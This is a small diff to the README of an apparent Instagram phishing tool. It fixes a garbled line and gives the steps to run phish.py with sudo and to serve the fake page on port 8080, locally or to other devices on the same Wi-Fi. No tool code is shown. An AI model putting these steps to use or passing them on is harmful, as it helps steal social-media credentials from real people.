@@ -41,7 +41,8 @@ cd instagram-phishing-tool
 # Make the script executable (if not already)
 chmod +x phish.py
 
-# Run with sudo (required for binding to ports)Accessing the phishing page
+# Run with sudo  python3 phish.py
+
 Locally: Open http://localhost:8080 in a browser
 Network (same Wi-Fi): Other devices visit http://<YOUR_IP>:8080
 Find your IP with: hostname -I or ip a | grep inet
